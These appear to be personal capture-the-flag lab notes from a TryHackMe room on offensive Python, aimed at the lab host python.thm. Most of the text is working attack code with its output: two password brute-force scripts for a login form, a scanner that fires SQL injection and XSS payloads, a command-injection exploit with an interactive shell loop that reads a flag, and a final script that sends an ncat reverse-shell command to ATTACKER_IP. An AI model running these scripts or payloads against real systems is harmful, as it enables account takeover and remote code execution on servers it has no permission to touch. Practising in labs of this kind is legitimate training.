![[Pasted image 20260622162724.png]]

```
nano /etc/hosts
 python.thm
```

***brute force***

```
nano bruteforce.py

```

```


import requests url = "http://python.thm/labs/lab1/index.php" username = "admin" # Generating 4-digit numeric passwords (0000-9999) password_list = [str(i).zfill(4) for i in range(10000)] def brute_force(): for password in password_list: data = {"username": username, "password": password} response = requests.post(url, data=data) if "Invalid" not in response.text: print(f"[+] Found valid credentials: {username}:{password}") break else: print(f"[-] Attempted: {password}") brute_force()

```


***Password found***

```

[-] Attempted: 1222
[-] Attempted: 1223
[-] Attempted: 1224
[-] Attempted: 1225
[-] Attempted: 1226
[-] Attempted: 1227
[-] Attempted: 1228
[-] Attempted: 1229
[-] Attempted: 1230
[-] Attempted: 1231
[-] Attempted: 1232
[-] Attempted: 1233
[+] Found valid credentials: admin:1234
    
```

![[Pasted image 20260622170533.png]]


**2nd flag try***

```
import requests  
from itertools import product  
from time import sleep  
  
# Target URL and username  
url = "http://python.thm/labs/lab1/index.php"  
username = "admin"  
  
# Generator for passwords like 000A to 999Z  
def generate_passwords():  
for digits in range(1000):  
for letter in range(65, 91): # ASCII A-Z = 65-90  
# Format the password: 3-digit + one uppercase letter  
yield f"{digits:03d}{chr(letter)}"  
  
# Function to try login with a given password  
def try_login(password):  
payload = {  
"username": username,  
"password": password  
}  
headers = {  
"User-Agent": "Mozilla/5.0",  
"Content-Type": "application/x-www-form-urlencoded"  
}  
  
try:  
response = requests.post(url, data=payload, headers=headers, timeout=5)  
return response  
except requests.RequestException as err:  
print(f"[!] Error with {password}: {err}")  
return None  
  
# Main brute-force loop  
def start_attack():  
for pwd in generate_passwords():  
response = try_login(pwd)  
if response is None:  
continue # Skip failed requests  
  
if "Invalid" not in response.text:  
print(f"[✓] Found credentials! Username: {username} | Password: {pwd}")  
break  
else:  
print(f"[-] Tried: {pwd}")  
sleep(0.05) # Optional delay  
  
start_attack()
```

```
import requests  
  
# Base URL to test for vulnerabilities  
url = "http://python.thm/labs/lab2/greetings.php"  
  
# Different payloads we want to test  
payloads = {  
"SQLi": [  
"'",  
"' OR '1'='1",  
"\" OR \"1\"=\"1",  
"'; --",  
"' UNION SELECT 1,2,3 --"  
],  
"XSS": [  
"<script>alert('XSS')</script>",  
"'><img src=x onerror=alert('XSS')>"  
]  
}  
  
# Common error messages that indicate SQL injection  
sql_errors = [  
"SQL syntax", "SQLite3::query():", "MySQL server", "syntax error",  
"Unclosed quotation mark", "near 'SELECT'", "Unknown column",  
"Warning: mysql_fetch", "Fatal error"  
]  
  
# Function to test a single payload  
def test_payload(vulnerability_type, payload):  
# Send GET request with 'id' parameter  
params = {"id": payload}  
try:  
response = requests.get(url, params=params, timeout=5)  
content = response.text.lower()  
  
# Check for SQL injection based on known error messages  
if vulnerability_type == "SQLi":  
for error in sql_errors:  
if error.lower() in content:  
print(f"[+] SQL Injection possible with: {payload}")  
break  
  
# Check for XSS by seeing if payload is reflected back  
elif vulnerability_type == "XSS":  
if payload.lower() in content:  
print(f"[+] XSS detected with: {payload}")  
  
except requests.RequestException as e:  
print(f"[!] Request failed for {payload}: {e}")  
  
# Main scanner loop  
def run_scanner():  
for vuln_type, tests in payloads.items():  
for p in tests:  
test_payload(vuln_type, p)  
  
# Start scanning  
run_scanner()
```

```
import requests import re import threading url = "http://python.thm/labs/lab2/greetings.php?id=" payloads = { "SQLi": ["'", "' OR '1'='1", "\" OR \"1\"=\"1", "'; --", "' UNION SELECT 1,2,3 --"], "XSS": ["<script>alert('XSS')</script>", "'><img src=x onerror=alert('XSS')>"] } sqli_errors = [ "SQL syntax","SQLite3::query():", "MySQL server", "syntax error", "Unclosed quotation mark", "near 'SELECT'", "Unknown column", "Warning: mysql_fetch", "Fatal error" ] def scan_payload(vuln_type, payload): response = requests.get(url, params={"id": payload}) content = response.text.lower() if vuln_type == "SQLi" and any(error.lower() in content for error in sqli_errors): print(f"[+] Potential SQL injection detected with payload: {payload}") elif vuln_type == "XSS" and payload.lower() in content: print(f"[+] Potential XSS detected with payload: {payload}") threads = [] for vuln, tests in payloads.items(): for payload in tests: t = threading.Thread(target=scan_payload, args=(vuln, payload)) threads.append(t) t.start() # Wait for all threads to finish for t in threads: t.join()
```

```
(root㉿kali)-[/home/kali/Desktop/Tryhackme]
└─# python scanner.py 
[+] Potential XSS detected with payload: <script>alert('XSS')</script>
[+] Potential XSS detected with payload: '><img src=x onerror=alert('XSS')>
   
┌──(root㉿kali)-[/home/kali/Desktop/Tryhackme]
└─# nano scanner2.py

┌──(root㉿kali)-[/home/kali/Desktop/Tryhackme]
└─# python3 scanner2.py                                                                                             
[+] XSS detected with: <script>alert('XSS')</script>
[+] XSS detected with: '><img src=x onerror=alert('XSS')>

┌──(root㉿kali)-[/home/kali/Desktop/Tryhackme]
└─# 

```

```
```python
import requests

# Target URL
TARGET_URL = "http://python.thm/labs/lab3/execute.php?cmd="

# Command to execute
command = "whoami"

# Construct the exploit request
response = requests.get(TARGET_URL + command)

# Print the response
if response.status_code == 200:
    print("[+] Command Output:")
    print(response.text)
else:
    print("[-] Exploit failed. HTTP Status:", response.status_code)
```

```
(root㉿kali)-[/home/kali/Desktop/Tryhackme]
└─# nano roomex.py  

┌──(root㉿kali)-[/home/kali/Desktop/Tryhackme]
└─# python3 roomex.py                                                                                               
[+] Command Output:
www-data
```


```
```python
import requests

# Target URL
TARGET_URL = "http://python.thm/labs/lab3/execute.php?cmd="

print("[+] Interactive Exploit Shell")
while True:
    cmd = input("Shell> ")  
    if cmd.lower() in ["exit", "quit"]:
        break
    
    response = requests.get(TARGET_URL + cmd)
    
    if response.status_code == 200:
        print(response.text)
    else:
        print("[-] Exploit failed")
```


```
 python3 roomex2.py
[+] Interactive Exploit Shell
Shell> ls
execute.php
flag.txt
index.php

Shell> cat flag.txt
THM{basic_exploit_using_python}
Shell> 

```

```
import requests

LOGIN_URL = "http://python.thm/labs/lab4/login.php"
EXECUTE_URL = "http://python.thm/labs/lab4/dashboard.php"
USERNAME = "admin"
PASSWORD = "password123"

def authenticate():
    session = requests.Session()
    response = session.post(LOGIN_URL, data={"username": USERNAME, "password": PASSWORD})

    if "Welcome" in response.text:
        print("[+] Authentication successful.")
        return session
    return None

def execute_command(session, command):
    response = session.post(EXECUTE_URL, data={"cmd": command})

    if "Session expired" in response.text:
        print("[-] Session expired! Re-authenticating...")
        session = authenticate()

    print(f"[+] Output:\n{response.text}")

def get_reverse_shell(session, attacker_ip, attacker_port):
    payload = f"ncat {attacker_ip} {attacker_port} -e /bin/bash"
    execute_command(session, payload)

session = authenticate()
if session:
    execute_command(session, "whoami")
    get_reverse_shell(session, "ATTACKER_IP", 4444)
```

![[Pasted image 20260622173807.png]]







